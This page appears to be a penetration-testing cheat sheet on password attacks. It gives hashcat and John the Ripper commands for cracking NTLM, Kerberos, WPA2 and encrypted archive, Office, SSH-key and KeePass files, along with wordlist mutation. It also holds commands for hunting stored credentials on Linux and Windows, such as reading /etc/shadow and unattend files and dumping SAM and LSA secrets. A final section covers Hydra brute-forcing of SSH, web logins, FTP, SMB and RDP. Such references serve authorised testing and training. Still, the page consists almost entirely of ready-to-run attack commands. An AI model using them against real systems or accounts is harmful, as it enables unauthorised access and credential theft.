+++
title = "Password Attacks & Cracking"
date = "2026-05-05T00:00:00-05:00"
tags = ["passwords", "hashcat", "john", "cracking", "hydra"]
description = "Hashcat modes, John the Ripper, cracking common file formats, password mutation, and network service brute-forcing."
draft = false
+++

## Hashcat — Common Modes

```bash
hashcat -m <mode> <hashfile> <wordlist> [options]

# Useful flags
-a 0          # dictionary attack (default)
-a 3          # brute-force/mask attack
-r rules.rule # apply rules
--show        # show cracked hashes
--username    # hash file has user:hash format
-O            # optimized kernels (faster, shorter passwords)
--force       # ignore warnings (GPU issues)
```

| Mode | Hash Type |
|------|-----------|
| 0 | MD5 |
| 100 | SHA-1 |
| 1000 | NTLM |
| 1800 | sha512crypt (Linux $6$) |
| 3200 | bcrypt |
| 5600 | NetNTLMv2 |
| 13100 | Kerberos TGS (Kerberoasting) |
| 18200 | Kerberos AS-REP (AS-REP Roasting) |
| 22000 | WPA2 (PMKID/EAPOL) |
| 7z | 11600 |
| zip | 13600 |
| pdf | 10500 |
| office 2013+ | 9600 |
| ssh private key | 22921 |

```bash
# Examples
hashcat -m 1000 ntlm.txt rockyou.txt
hashcat -m 13100 tgs.txt rockyou.txt
hashcat -m 5600 netntlmv2.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# Mask attack — 8-char, upper+lower+digit
hashcat -m 1000 hash.txt -a 3 ?u?l?l?l?l?d?d?d

# Mask charsets: ?l=lower ?u=upper ?d=digit ?s=special ?a=all
```

---

## John the Ripper

```bash
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
john hash.txt --wordlist=rockyou.txt --rules
john --show hash.txt

# Format detection
john --list=formats | grep -i ntlm
john hash.txt --format=NT --wordlist=rockyou.txt
```

---

## Cracking Common File Formats

```bash
# ZIP
zip2john file.zip > zip.hash
john zip.hash --wordlist=rockyou.txt
# or: hashcat -m 13600 zip.hash rockyou.txt

# RAR
rar2john file.rar > rar.hash
john rar.hash --wordlist=rockyou.txt

# 7z
7z2john file.7z > 7z.hash
john 7z.hash --wordlist=rockyou.txt

# PDF
pdf2john file.pdf > pdf.hash
john pdf.hash --wordlist=rockyou.txt
# or: hashcat -m 10500 pdf.hash rockyou.txt

# Office (docx, xlsx, etc.)
office2john file.docx > office.hash
john office.hash --wordlist=rockyou.txt
# or: hashcat -m 9600 office.hash rockyou.txt   (Office 2013+)

# SSH private key
ssh2john id_rsa > ssh.hash
john ssh.hash --wordlist=rockyou.txt
# or: hashcat -m 22921 ssh.hash rockyou.txt

# KeePass .kdbx
keepass2john db.kdbx > keepass.hash
john keepass.hash --wordlist=rockyou.txt

# PKCS12 / .pfx
pfx2john cert.pfx > pfx.hash
john pfx.hash --wordlist=rockyou.txt
```

---

## Password Mutations

```bash
# cewl — generate wordlist from website
cewl http://target.com -d 3 -m 6 -w cewl_words.txt
cewl http://target.com -d 2 --with-numbers -w words.txt

# Hashcat rules — best64 is a good starting point
hashcat -m 1000 hash.txt wordlist.txt -r /usr/share/hashcat/rules/best64.rule
hashcat -m 1000 hash.txt wordlist.txt -r /usr/share/hashcat/rules/rockyou-30000.rule

# Common manual mutations (add to custom rule file)
# Append year:        $2$0$2$4
# Capitalize first:   c
# Append !:           $!
# Prepend special:    ^!

# Username-based wordlist
# Many users set passwords like: Company2024! Season+Year Company@123
# Generate permutations with hashcat rules or manually

# Default credentials reference
# /usr/share/seclists/Passwords/Default-Credentials/
```

---

## Linux Credential Hunting

```bash
# /etc/shadow — needs root
cat /etc/shadow
# Format: user:$type$salt$hash — $1$=md5, $6$=sha512

# Copy to crack offline
unshadow /etc/passwd /etc/shadow > unshadowed.txt
john unshadowed.txt --wordlist=rockyou.txt

# Search for cleartext passwords
grep -r "password" /etc /var /home 2>/dev/null
grep -r "PASSWORD" /etc /var /home 2>/dev/null
find / -name "*.conf" -exec grep -l "pass" {} \; 2>/dev/null
find / -name ".bash_history" 2>/dev/null -exec cat {} \;
find / -name "id_rsa" 2>/dev/null
```

---

## Windows Credential Hunting

```powershell
# Stored credentials
cmdkey /list

# Search files
findstr /si "password" *.txt *.xml *.ini *.config 2>nul
dir /s *password* *cred* *secret* 2>nul

# Unattend / sysprep files
type C:\Windows\Panther\Unattend.xml
type C:\Windows\System32\sysprep\sysprep.xml

# Registry — autologon, wireless keys
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s
```

```bash
# From Linux — dump SAM via impacket
impacket-secretsdump -sam SAM -security SECURITY -system SYSTEM LOCAL
impacket-secretsdump DOMAIN/user:pass@<target>

# Dump with crackmapexec
crackmapexec smb <target> -u user -p pass --sam
crackmapexec smb <target> -u user -p pass --lsa
crackmapexec smb <target> -u user -p pass -M lsassy
```

---

## Network Service Brute-Force (Hydra)

```bash
# SSH
hydra -l admin -P rockyou.txt ssh://<target>
hydra -L users.txt -P rockyou.txt ssh://<target> -t 4

# SSH on custom port
hydra -l user -P rockyou.txt -s 2222 ssh://<target>

# HTTP POST form
hydra -l admin -P rockyou.txt <target> http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"

# HTTP Basic Auth
hydra -l admin -P rockyou.txt <target> http-get /admin

# FTP / SMB / RDP
hydra -l admin -P rockyou.txt ftp://<target>
hydra -l admin -P rockyou.txt smb://<target>
hydra -l admin -P rockyou.txt rdp://<target>

# WinRM
crackmapexec winrm <target> -u users.txt -p passwords.txt
```
